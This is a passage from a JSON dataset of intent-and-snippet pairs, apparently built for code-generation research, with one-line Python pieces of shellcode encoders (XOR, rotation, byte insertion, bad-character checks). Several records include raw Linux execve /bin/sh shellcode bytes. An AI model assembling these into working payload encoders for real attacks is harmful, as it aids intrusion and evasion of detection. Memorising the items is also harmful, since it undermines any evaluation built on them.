'0x'"},{"intent": "add the string value '\\\\x' to the variable encoded_shellcode", "rewritten_intent": "add the string value '\\\\x' to the variable encoded_shellcode", "snippet": "encoded_shellcode += \"\\\\x\""},{"intent": "Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_shellcode", "rewritten_intent": "Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_shellcode", "snippet": "encoded_shellcode += \"%02x\" %(z & 0xff)"},{"intent": "encoded_shellcode is a string \"\"", "rewritten_intent": "encoded_shellcode is a string \"\"", "snippet": "encoded_shellcode = \"\""},{"intent": "initialize the variable encoded_shellcode to an empty string", "rewritten_intent": "initialize the variable encoded_shellcode to an empty string", "snippet": "encoded_shellcode = \"\""},{"intent": "append to encoded a bytes object containing the value val1 packed according to the format string unsigned char", "rewritten_intent": "append to encoded a bytes object containing the value val1 packed according to the format string unsigned char", "snippet": "encoded.append(struct.pack('B', val1))"},{"intent": "append to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char", "rewritten_intent": "append to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char", "snippet": "encoded.append(struct.pack('B', xor_byte))"},{"intent": "add to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char", "rewritten_intent": "add to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char", "snippet": "encoded.append(struct.pack('B', xor_byte))"},{"intent": "append to encoded the bytes object containing the value xor_byte packed according to the format string unsigned char", "rewritten_intent": "append to encoded the bytes object containing the value xor_byte packed according to the format string unsigned char", "snippet": "encoded.append(struct.pack('B', xor_byte))"},{"intent": "add the string value '\\\\x' to the variable encoded1", "rewritten_intent": "add the string value '\\\\x' to the variable encoded1", "snippet": "encoded1 += '\\\\x'"},{"intent": "Convert the value of j to a hexadecimal then add it to the variable encoded1", "rewritten_intent": "Convert the value of j to a hexadecimal then add it to the variable encoded1", "snippet": "encoded1 += '%02x' %j"},{"intent": "initialize an empty string variable called encoded1", "rewritten_intent": "initialize an empty string variable called encoded1", "snippet": "encoded1 = \"\""},{"intent": "add the string value ',' to the variable encoded2", "rewritten_intent": "add the string value ',' to the variable encoded2", "snippet": "encoded2 += ','"},{"intent": "Convert the value of j to a hexadecimal then add it to the variable encoded2 followed by the string ', '", "rewritten_intent": "Convert the value of j to a hexadecimal then add it to the variable encoded2 followed by the string ', '", "snippet": "encoded2 += '%02x, ' %j"},{"intent": "Convert the value of y bitwise and 0xff to a hexadecimal then add it to the variable encoded2 followed by the string ','", "rewritten_intent": "Convert the value of y bitwise and 0xff to a hexadecimal then add it to the variable encoded2 followed by the string ','", "snippet": "encoded2 += '%02x,' % (y & 0xff)"},{"intent": "Convert the value of x to a hexadecimal then add it to the variable encoded2 followed by the string ', '", "rewritten_intent": "Convert the value of x to a hexadecimal then add it to the variable encoded2 followed by the string ', '", "snippet": "encoded2 += '%02x,' % x"},{"intent": "Convert the variable x to a hexadecimal. Concatenate the result with the string ',' add the result to the variable encoded2", "rewritten_intent": "Convert the variable x to a hexadecimal. Concatenate the result with the string ',' add the result to the variable encoded2", "snippet": "encoded2 += '%02x,' % x"},{"intent": "Convert the variable y to a hexadecimal. Concatenate the result with the string ',' and add the result to the variable encoded2", "rewritten_intent": "Convert the variable y to a hexadecimal. Concatenate the result with the string ',' and add the result to the variable encoded2", "snippet": "encoded2 += '%02x,' % y"},{"intent": "convert (7 -(256 - x)) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2", "rewritten_intent": "convert (7 -(256 - x)) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2", "snippet": "encoded2 += '%02x,' %(7 -(256 - x))"},{"intent": "Convert the value of h bitwise and 0xff to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2", "rewritten_intent": "Convert the value of h bitwise and 0xff to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2", "snippet": "encoded2 += '%02x,' %(h & 0xff)"},{"intent": "convert (x+7) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2", "rewritten_intent": "convert (x+7) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2", "snippet": "encoded2 += '%02x,' %(x+7)"},{"intent": "Convert the value of y to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2", "rewritten_intent": "Convert the value of y to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2", "snippet": "encoded2 += '%02x,' %y"},{"intent": "append string '0x' to encoded2", "rewritten_intent": "append string '0x' to encoded2", "snippet": "encoded2 += '0x'"},{"intent": "append '0x' to the string encoded2", "rewritten_intent": "append '0x' to the string encoded2", "snippet": "encoded2 += '0x'"},{"intent": "add the string value '0x' to the variable encoded2", "rewritten_intent": "add the string value '0x' to the variable encoded2", "snippet": "encoded2 += '0x'"},{"intent": "concatenate the string '0x' with the hexadecimal conversion of 0xAA and append the result to the string encoded2", "rewritten_intent": "concatenate the string '0x' with the hexadecimal conversion of 0xAA and append the result to the string encoded2", "snippet": "encoded2 += '0x%02x,' % 0xAA"},{"intent": "concatenate the string '0x' with the hexadecimal conversion of rand and append the result to the string encoded2", "rewritten_intent": "concatenate the string '0x' with the hexadecimal conversion of rand and append the result to the string encoded2", "snippet": "encoded2 += '0x%02x,' % rand"},{"intent": "Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded2", "rewritten_intent": "Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded2", "snippet": "encoded2 += hex(leader)[2:]"},{"intent": "slice the variable insertByte at index 2 and add the value to the variable encoded2", "rewritten_intent": "slice the variable insertByte at index 2 and add the value to the variable encoded2", "snippet": "encoded2 += insertByte[2:]"},{"intent": "add the value of xxx to the variable encoded2", "rewritten_intent": "add the value of xxx to the variable encoded2", "snippet": "encoded2 += xxx"},{"intent": "set the variable encoded2 to an empty string", "rewritten_intent": "set the variable encoded2 to an empty string", "snippet": "encoded2 = ' '"},{"intent": "set encoded2 to the string '0x'", "rewritten_intent": "set encoded2 to the string '0x'", "snippet": "encoded2 = '0x'"},{"intent": "encoded2 is a string \"\"", "rewritten_intent": "encoded2 is a string \"\"", "snippet": "encoded2 = \"\""},{"intent": "encoded2 is string \"\"", "rewritten_intent": "encoded2 is string \"\"", "snippet": "encoded2 = \"\""},{"intent": "encoded2 is an empty string", "rewritten_intent": "encoded2 is an empty string", "snippet": "encoded2 = \"\""},{"intent": "initialize an empty string variable called encoded2", "rewritten_intent": "initialize an empty string variable called encoded2", "snippet": "encoded2 = \"\""},{"intent": "encoded2 is the concatenation of the string \"0x\" with the hexadecimal conversion of the lenght of the array of bytes of shellcode", "rewritten_intent": "encoded2 is the concatenation of the string \"0x\" with the hexadecimal conversion of the lenght of the array of bytes of shellcode", "snippet": "encoded2 = \"0x%02x,\" % len(bytearray(shellcode))"},{"intent": "convert the value x to hex, concatenate the result with ',' and append it to the string encoded2P2", "rewritten_intent": "convert the value x to hex, concatenate the result with ',' and append it to the string encoded2P2", "snippet": "encoded2P2 += '%02x,' % x"},{"intent": "append string '0x' to encoded2P2", "rewritten_intent": "append string '0x' to encoded2P2", "snippet": "encoded2P2 += '0x'"},{"intent": "encoded2P2 is string \"\"", "rewritten_intent": "encoded2P2 is string \"\"", "snippet": "encoded2P2 = \"\""},{"intent": "append string '\\\\x' to encodedP2", "rewritten_intent": "append string '\\\\x' to encodedP2", "snippet": "encodedP2 += '\\\\x'"},{"intent": "convert the value x to hex and append it to the string encodedP2", "rewritten_intent": "convert the value x to hex and append it to the string encodedP2", "snippet": "encodedP2 += '%02x' % x"},{"intent": "encodedP2 is string \"\"", "rewritten_intent": "encodedP2 is string \"\"", "snippet": "encodedP2 = \"\""},{"intent": "end is a string \"\\\\xaa\"", "rewritten_intent": "end is a string \"\\\\xaa\"", "snippet": "end = \"\\\\xaa\""},{"intent": "declare an except statement", "rewritten_intent": "declare an except statement", "snippet": "except:"},{"intent": "execve_shellcode is a bytearrary of the byte string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xe3\\xb0\\x0b\\xcd\\x80\"", "rewritten_intent": "execve_shellcode is a bytearrary of the byte string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xe3\\xb0\\x0b\\xcd\\x80\"", "snippet": "execve_shellcode = bytearray(b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xe3\\xb0\\x0b\\xcd\\x80\")"},{"intent": "execve_shellcode is a bytearray of execve_shellcode", "rewritten_intent": "execve_shellcode is a bytearray of execve_shellcode", "snippet": "execve_shellcode = bytearray(execve_shellcode)"},{"intent": "append 0x90 to execve_shellcode", "rewritten_intent": "append 0x90 to execve_shellcode", "snippet": "execve_shellcode.append(0x90)"},{"intent": "exit with 1", "rewritten_intent": "exit with 1", "snippet": "exit(1)"},{"intent": "terminate the program with exit code 1", "rewritten_intent": "terminate the program with exit code 1", "snippet": "exit(1)"},{"intent": "terminate the program with exit code 2", "rewritten_intent": "terminate the program with exit code 2", "snippet": "exit(2)"},{"intent": "terminate the program with exit code 3", "rewritten_intent": "terminate the program with exit code 3", "snippet": "exit(3)"},{"intent": "Convert the value of leader to hexadecimal, then slice it between the indicies 2 and 3, convert it to an int16 and add its value to the variable fb", "rewritten_intent": "Convert the value of leader to hexadecimal, then slice it between the indicies 2 and 3, convert it to an int16 and add its value to the variable fb", "snippet": "fb = int(hex(leader)[2:3],16)"},{"intent": "concatenate in the string final_shellcode the concatenation of '\\\\x' and the string byte encoded in hexadecimal", "rewritten_intent": "concatenate in the string final_shellcode the concatenation of '\\\\x' and the string byte encoded in hexadecimal", "snippet": "final_shellcode += '\\\\x' + byte.encode('hex')"},{"intent": "iterate bad_byte in bad_chars", "rewritten_intent": "iterate bad_byte in bad_chars", "snippet": "for bad_byte in bad_chars:"},{"intent": "iterate bytes in list bad_chars", "rewritten_intent": "iterate bytes in list bad_chars", "snippet": "for byte in bad_chars:"},{"intent": "iterate byte in the list bytes", "rewritten_intent": "iterate byte in the list bytes", "snippet": "for byte in bytes:"},{"intent": "iterate byte in decoder_stub", "rewritten_intent": "iterate byte in decoder_stub", "snippet": "for byte in decoder_stub:"},{"intent": "iterate over bytes in decoder_stub", "rewritten_intent": "iterate over bytes in decoder_stub", "snippet": "for byte in decoder_stub:"},{"intent": "iterate over bytes in encoder", "rewritten_intent": "iterate over bytes in encoder", "snippet": "for byte in encoder:"},{"intent": "iterate char over bad_chars", "rewritten_intent": "iterate char over bad_chars", "snippet": "for char in bad_chars:"},{"intent": "loop through shellcode converted into a bytearray", "rewritten_intent": "loop through shellcode converted into a bytearray", "snippet": "for i in bytearray(shellcode):"},{"intent": "Make a for loop for each i in the bytearray of shellcode", "rewritten_intent": "Make a for loop for each i in the bytearray of shellcode", "snippet": "for i in bytearray(shellcode):"},{"intent": "loop over execve_shellcode", "rewritten_intent": "loop over execve_shellcode", "snippet": "for i in execve_shellcode:"},{"intent": "iterate i over 255 random numbers between 1 and 256", "rewritten_intent": "iterate i over 255 random numbers between 1 and 256", "snippet": "for i in random.sample(range(1, 256), 255):"},{"intent": "iterate i over a sequence of number from 0 to 2", "rewritten_intent": "iterate i over a sequence of number from 0 to 2", "snippet": "for i in range(0, 2):"},{"intent": "initialize a for loop with an iterator i with a range starting from 0 until the length of shellcode_original with a step of 4", "rewritten_intent": "initialize a for loop with an iterator i with a range starting from 0 until the length of shellcode_original with a step of 4", "snippet": "for i in range(0, len(shellcode_original), 4):"},{"intent": "initialize a for loop with an iterator i with a range starting from 0 until the value of padding", "rewritten_intent": "initialize a for loop with an iterator i with a range starting from 0 until the value of padding", "snippet": "for i in range(0, padding):"},{"intent": "Make a for loop for each x in the bytearray of buf", "rewritten_intent": "Make a for loop for each x in the bytearray of buf", "snippet": "for x in bytearray(buf) :"},{"intent": "loop through shellcode converted into a bytearray", "rewritten_intent": "loop through shellcode converted into a bytearray", "snippet": "for x in bytearray(shellcode) :"},{"intent": "loop x over the bytearray of the string shellcode", "rewritten_intent": "loop x over the bytearray of the string shellcode", "snippet": "for x in bytearray(shellcode) :"},{"intent": "iterate x over the array of bytes of the string shellcode", "rewritten_intent": "iterate x over the array of bytes of the string shellcode", "snippet": "for x in bytearray(shellcode) :"},{"intent": "loop through shellcode converted into a bytearray", "rewritten_intent": "loop through shellcode converted into a bytearray", "snippet": "for x in bytearray(shellcode):"},{"intent": "Make a for loop for each x in the bytearray of shellcode", "rewritten_intent": "Make a for loop for each x in the bytearray of shellcode", "snippet": "for x in bytearray(shellcode):"},{"intent": "declare a for loop with an iterator x for each element in shellcode starting from index 2 converted into a bytearray", "rewritten_intent": "declare a for loop with an iterator x for each element in shellcode starting from index 2 converted into a bytearray", "snippet": "for x in bytearray(shellcode)[2:]:"},{"intent": "loop through shellcode converted into a bytearray", "rewritten_intent": "loop through shellcode converted into a bytearray", "snippet": "for y in bytearray(shellcode):"},{"intent": "concatenate '0x' to the string format_0x", "rewritten_intent": "concatenate '0x' to the string format_0x", "snippet": "format_0x += '0x'"},{"intent": "append encoded_instruction_in_hex and string \",\" to format_0x", "rewritten_intent": "append encoded_instruction_in_hex and string \",\" to format_0x", "snippet": "format_0x += encoded_instruction_in_hex+\",\""},{"intent": "format_0x is a string \"\"", "rewritten_intent": "format_0x is a string \"\"", "snippet": "format_0x = \"\""},{"intent": "format_slash_x is a string \"\"", "rewritten_intent": "format_slash_x is a string \"\"", "snippet": "format_slash_x = \"\""},{"intent": "h is the sum of y and rot modulo 256", "rewritten_intent": "h is the sum of y and rot modulo 256", "snippet": "h = (y + rot)%256"},{"intent": "Convert the variable x to a hexadecimal and store it in the variable hopcode", "rewritten_intent": "Convert the variable x to a hexadecimal and store it in the variable hopcode", "snippet": "hopcode = '%02x' %x"},{"intent": "add 1 to the value of i", "rewritten_intent": "add 1 to the value of i", "snippet": "i += 1"},{"intent": "add 1 to the value of i", "rewritten_intent": "add 1 to the value of i", "snippet": "i +=1"},{"intent": "set the variable i to 0", "rewritten_intent": "set the variable i to 0", "snippet": "i=0"},{"intent": "if string \"0x0,\" is in format_0x", "rewritten_intent": "if string \"0x0,\" is in format_0x", "snippet": "if \"0x0,\" in format_0x:"},{"intent": "check if the length of execve_shellcode is not even", "rewritten_intent": "check if the length of execve_shellcode is not even", "snippet": "if (len(execve_shellcode)%2)!=0:"},{"intent": "check if the following expression is true r bitwise xor shellcode_original at index i is not equal to 0 and r bitwise xor shellcode_original at index i+1 does not equal 0 and r bitwise xor shellcode_original at index i+2 does not equal 0 and r bitwise xor shellcode_original at index i+3 does not equal 0", "rewritten_intent": "check if the following expression is true r bitwise xor shellcode_original at index i is not equal to 0 and r bitwise xor shellcode_original at index i+1 does not equal 0 and r bitwise xor shellcode_original at index i+2 does not equal 0 and r bitwise xor shellcode_original at index i+3 does not equal 0", "snippet": "if (r ^ shellcode_original[i] != 0) and (r ^ shellcode_original[i+1] != 0) and (r ^ shellcode_original[i+2] != 0) and (r ^ shellcode_original[i+3] != 0):"},{"intent": "if char is equal to byte", "rewritten_intent": "if char is equal to byte", "snippet": "if char == byte:"},{"intent": "if count modulo 2 is different from zero", "rewritten_intent": "if count modulo 2 is different from zero", "snippet": "if count % 2 != 0:"},{"intent": "if counter modulo 2 is equal to 0", "rewritten_intent": "if counter modulo 2 is equal to 0", "snippet": "if counter % 2 == 0 :"},{"intent": "if i is lower than the length of chunk", "rewritten_intent": "if i is lower than the length of chunk", "snippet": "if i < len(chunk):"},{"intent": "convert the string byte to hex, then cast the result to int16 and then check if it is equal to i", "rewritten_intent": "convert the string byte to hex, then cast the result to int16 and then check if it is equal to i", "snippet": "if i == int(byte.encode('hex'), 16):"},{"intent": "convert to integer base 16 the string byte encoded to hex and check if it is equal to i", "rewritten_intent": "convert to integer base 16 the string byte encoded to hex and check if it is equal to i", "snippet": "if i == int(byte.encode('hex'), 16):"},{"intent": "if the length of shellcode_original is not divisable by 4", "rewritten_intent": "if the length of shellcode_original is not divisable by 4", "snippet": "if len(shellcode_original) % 4 != 0:"},{"intent": "if the length of sys.argv is different from 3", "rewritten_intent": "if the length of sys.argv is different from 3", "snippet": "if len(sys.argv) != 3:"},{"intent": "if the number of arguments is lower than 2", "rewritten_intent": "if the number of arguments is lower than 2", "snippet": "if len(sys.argv) < 2:"},{"intent": "check if the total number of command-line arguments are less than 2", "rewritten_intent": "check if the total number of command-line arguments are less than 2", "snippet": "if len(sys.argv) < 2:"},{"intent": "if the number of arguments is higher than 2", "rewritten_intent": "if the number of arguments is higher than 2", "snippet": "if len(sys.argv) > 2:"},{"intent": "Check if the length of xxx is greater than 4", "rewritten_intent": "Check if the length of xxx is greater than 4", "snippet": "if len(xxx)>4:"},{"intent": "if matched_a_byte is True", "rewritten_intent": "if matched_a_byte is True", "snippet": "if matched_a_byte:"},{"intent": "check if n is greater or equals to 0", "rewritten_intent": "check if n is greater or equals to 0", "snippet": "if n >= 0:"},{"intent": "if matched_a_byte is not True", "rewritten_intent": "if matched_a_byte is not True", "snippet": "if not matched_a_byte:"},{"intent": "check if padding does not equal 0", "rewritten_intent": "check if padding does not equal 0", "snippet": "if padding:"},{"intent": "check if rotations is less than the value of 1", "rewritten_intent": "check if rotations is less than the value of 1", "snippet": "if rotations < 1:"},{"intent": "check if the variable rotations is less than 1", "rewritten_intent": "check if the variable rotations is less than 1", "snippet": "if rotations < 1:"},{"intent": "check if the bytes object containing the value val1 xor i packed according to the format string unsigned char is equal to bad_byte", "rewritten_intent": "check if the bytes object containing the value val1 xor i packed according to the format string unsigned char is equal to bad_byte", "snippet": "if struct.pack('B', val1 ^ i) == bad_byte:"},{"intent": "if stub_has_bad_char is True", "rewritten_intent": "if stub_has_bad_char is True", "snippet": "if stub_has_bad_char:"},{"intent": "if total does not equal 2", "rewritten_intent": "if total does not equal 2", "snippet": "if total != 2:"},{"intent": "if x is less than 128", "rewritten_intent": "if x is less than 128", "snippet": "if x < 128:"},{"intent": "check if x is less then 128", "rewritten_intent": "check if x is less then 128", "snippet": "if x < 128:"},{"intent": "check if x is equivalent to the element n in shellcode converted into a bytearray", "rewritten_intent": "check if x is equivalent to the element n in shellcode converted into a bytearray", "snippet": "if x == bytearray(shellcode)[n]:"},{"intent": "if x is greater than 248", "rewritten_intent": "if x is greater than 248", "snippet": "if x > 248:"},{"intent": "check if x is greater than 248", "rewritten_intent": "check if x is greater than 248", "snippet": "if x > 248:"},{"intent": "if xor_byte is equal to 0", "rewritten_intent": "if xor_byte is equal to 0", "snippet": "if xor_byte == 0:"},{"intent": "import the package binascii", "rewritten_intent": "import the package binascii", "snippet": "import binascii"},{"intent": "import module random", "rewritten_intent": "import module random", "snippet": "import random"},{"intent": "import the package random", "rewritten_intent": "import the package random", "snippet": "import random"},{"intent": "import the package random", "rewritten_intent": "import the package random", "snippet": "import random;"},{"intent": "import the package socket", "rewritten_intent": "import the package socket", "snippet": "import socket"},{"intent": "import the package struct", "rewritten_intent": "import the package struct", "snippet": "import struct"},{"intent": "import module sys", "rewritten_intent": "import module sys", "snippet": "import sys"},{"intent": "import the package sys", "rewritten_intent": "import the package sys", "snippet": "import sys"},{"intent": "import the sys package", "rewritten_intent": "import the sys package", "snippet": "import sys"},{"intent": "generate a random integer between 1 and 255 then convert the random number into a hexadecimal and store the value in insertByte", "rewritten_intent": "generate a random integer between 1 and 255 then convert the random number into a hexadecimal and store the value in insertByte", "snippet": "insertByte = hex(random.randint(1,255))"},{"intent": "Store in the variable j the sum of i and magic modulus 256", "rewritten_intent": "Store in the variable j the sum of i and magic modulus 256", "snippet": "j = (i + magic)%256"},{"intent": "set leader to the first command-line argument after casting it to an int", "rewritten_intent": "set leader to the first command-line argument after casting it to an int", "snippet": "leader = int(sys.argv[1])"},{"intent": "return the length of array of bytes of the string shellcode", "rewritten_intent": "return the length of array of bytes of the string shellcode", "snippet": "len(bytearray(shellcode)))"},{"intent": "length_format_0x is the count of \",\" in format_0x", "rewritten_intent": "length_format_0x is the count of \",\" in format_0x", "snippet": "length_format_0x = format_0x.count(',')"},{"intent": "set the variable magic to the value 13", "rewritten_intent": "set the variable magic to the value 13", "snippet": "magic = 13"},{"intent": "call the function mask with the argument width and save the return value in mask_value", "rewritten_intent": "call the function mask with the argument width and save the return value in mask_value", "snippet": "mask_value = mask(width)"},{"intent": "matched_a_byte is initialized to False", "rewritten_intent": "matched_a_byte is initialized to False", "snippet": "matched_a_byte = False"},{"intent": "matched_a_byte is True", "rewritten_intent": "matched_a_byte is True", "snippet": "matched_a_byte = True"},{"intent": "max_bits is an integer 8", "rewritten_intent": "max_bits is an integer 8", "snippet": "max_bits = 8"},{"intent": "store in the variable n the result of the bitwise and operation between n and the function mask with the parameter width", "rewritten_intent": "store in the variable n the result of the bitwise and operation between n and the function mask with the parameter width", "snippet": "n &= mask(width)"},{"intent": "increment the variable n by 1", "rewritten_intent": "increment the variable n by 1", "snippet": "n += 1"},{"intent": "set the variable n to the value 1", "rewritten_intent": "set the variable n to the value 1", "snippet": "n = 1"},{"intent": "convert shellcode to a bytearray and store its length in the variable n", "rewritten_intent": "convert shellcode to a bytearray and store its length in the variable n", "snippet": "n = len(bytearray(shellcode))"},{"intent": "substitute elements of nasm from the index 1 to end for nasm", "rewritten_intent": "substitute elements of nasm from the index 1 to end for nasm", "snippet": "nasm = nasm[1:]"},{"intent": "convert encoded to string and replace all occurrences of \"\\\\x\" with \",0x\" in it", "rewritten_intent": "convert encoded to string and replace all occurrences of \"\\\\x\" with \",0x\" in it", "snippet": "nasm = str(encoded).replace(\"\\\\x\", \",0x\")"},{"intent": "nbits is the second element of sys.argv converted to integer", "rewritten_intent": "nbits is the second element of sys.argv converted to integer", "snippet": "nbits = int(sys.argv[2])"},{"intent": "new is not i and 0xff", "rewritten_intent": "new is not i and 0xff", "snippet": "new = ~i & 0xff"},{"intent": "new is new xor xor", "rewritten_intent": "new is new xor xor", "snippet": "new = new ^ xor"},{"intent": "new is new shifted left by shift", "rewritten_intent": "new is new shifted left by shift", "snippet": "new = new << shift"},{"intent": "offset is an integer 1", "rewritten_intent": "offset is an integer 1", "snippet": "offset = 1"},{"intent": "orig is an empty list", "rewritten_intent": "orig is an empty list", "snippet": "orig = []"},{"intent": "append i to orig", "rewritten_intent": "append i to orig", "snippet": "orig.append(i)"},{"intent": "convert the value x in hexadecimal and append it to the string original_shellcode followed by ','", "rewritten_intent": "convert the value x in hexadecimal and append it to the string original_shellcode followed by ','", "snippet": "original_shellcode += '%02x, ' %x"},{"intent": "append string '0x' to original_shellcode", "rewritten_intent": "append string '0x' to original_shellcode", "snippet": "original_shellcode += '0x'"},{"intent": "original_shellcode is a string \"\"", "rewritten_intent": "original_shellcode is a string \"\"", "snippet": "original_shellcode = \"\""},{"intent": "P is a string '\\033[35m'", "rewritten_intent": "P is a string '\\033[35m'", "snippet": "P = '\\033[35m'"},{"intent": "set the variable padding equal to 0", "rewritten_intent": "set the variable padding equal to 0", "snippet": "padding = 0"},{"intent": "set the variable padding equal to 4 minus the length of shellcode_original modulus 4", "rewritten_intent": "set the variable padding equal to 4 minus the length of shellcode_original modulus 4", "snippet": "padding = 4 - (len(shellcode_original) % 4)"},{"intent": "set the variable r to a random integer between 1 and 255", "rewritten_intent": "set the variable r to a random integer between 1 and 255", "snippet": "r = random.randint(1,255)"},{"intent": "generate a random integer between 1 and 8 and store it in a variable called rand", "rewritten_intent": "generate a random integer between 1 and 8 and store it in a variable called rand", "snippet": "rand = random.randint(1,8)"},{"intent": "initialize a random number generator", "rewritten_intent": "initialize a random number generator", "snippet": "random.seed()"},{"intent": "right shift by val2 the and operation between x and val1 and assign it to res1", "rewritten_intent": "right shift by val2 the and operation between x and val1 and assign it to res1", "snippet": "res1 = ((x & val1) >> val2)"},{"intent": "perform the and operation between x shifted left by val2 and val1 and assign the result to res1", "rewritten_intent": "perform the and operation between x shifted left by val2 and val1 and assign the result to res1", "snippet": "res1 = (x << val2) & (val1)"},{"intent": "res2 is the result of the and operation between x and val1", "rewritten_intent": "res2 is the result of the and operation between x and val1", "snippet": "res2 = (x & val1)"},{"intent": "res2 is the result of the and operation between res2 and val1", "rewritten_intent": "res2 is the result of the and operation between res2 and val1", "snippet": "res2 = res2 & val1"},{"intent": "right shift res2 by max_bits minus val2", "rewritten_intent": "right shift res2 by max_bits minus val2", "snippet": "res2 = res2 >> (max_bits-val2)"},{"intent": "left shift x by max_bits minus val2 and assign the result to res2", "rewritten_intent": "left shift x by max_bits minus val2 and assign the result to res2", "snippet": "res2 = x << (max_bits - val2)"},{"intent": "return the result of bitwise left shift of n by rotations bitwise and with mask_value bitwise or n  bitwise right shift by the subtraction of rotations from width", "rewritten_intent": "return the result of bitwise left shift of n by rotations bitwise and with mask_value bitwise or n  bitwise right shift by the subtraction of rotations from width", "snippet": "return ((n << rotations) & mask_value) | (n >> (width - rotations))"},{"intent": "return the result of n bitwise right shift with rotations or n bitwise left shift by width minus rotations and the bitwise and operation with mask_value", "rewritten_intent": "return the result of n bitwise right shift with rotations or n bitwise left shift by width minus rotations and the bitwise and operation with mask_value", "snippet": "return (n >> rotations) | ((n << (width - rotations)) & mask_value)"},{"intent": "return the value of 0", "rewritten_intent": "return the value of 0", "snippet": "return 0"},{"intent": "return 2 to the power of n and subtract 1", "rewritten_intent": "return 2 to the power of n and subtract 1", "snippet": "return 2**n - 1"},{"intent": "return i", "rewritten_intent": "return i", "snippet": "return i"},{"intent": "return the value of n", "rewritten_intent": "return the value of n", "snippet": "return n"},{"intent": "return the value n", "rewritten_intent": "return the value n", "snippet": "return n"},{"intent": "get the hexadecimal value of suplX and reverse its order then store the value in rev_suplx", "rewritten_intent": "get the hexadecimal value of suplX and reverse its order then store the value in rev_suplx", "snippet": "rev_suplx = hex(suplX)[::-1]"},{"intent": "rot is an integer 8", "rewritten_intent": "rot is an integer 8", "snippet": "rot = 8"},{"intent": "ROT is the first element of sys.argv converted to integer", "rewritten_intent": "ROT is the first element of sys.argv converted to integer", "snippet": "ROT = int(sys.argv[1])"},{"intent": "store in the variable rotations the modulus of rotations and width", "rewritten_intent": "store in the variable rotations the modulus of rotations and width", "snippet": "rotations %= width"},{"intent": "rox_encoded_instruction is the result of the or operation between res1 and res2", "rewritten_intent": "rox_encoded_instruction is the result of the or operation between res1 and res2", "snippet": "rox_encoded_instruction = res1 | res2"},{"intent": "Convert the value of leader to hexadecimal, then slice it at index 3, convert it to an int16 and set its value to the variable sb", "rewritten_intent": "Convert the value of leader to hexadecimal, then slice it at index 3, convert it to an int16 and set its value to the variable sb", "snippet": "sb = int(hex(leader)[3:],16)"},{"intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "rewritten_intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "snippet": "shellcode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\""},{"intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xdc\\xb0\\x0b\\xcd\\x80\"", "rewritten_intent": "shellcode is a string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xdc\\xb0\\x0b\\xcd\\x80\"", "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xdc\\xb0\\x0b\\xcd\\x80\")"},{"intent": "define shellcode as a tuple and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"", "rewritten_intent": "define shellcode as a tuple and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"", "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\")"},{"intent": "define shellcode as a tuple and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "rewritten_intent": "define shellcode as a tuple and add the string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "snippet": "shellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")"},{"intent": "shellcode is a string 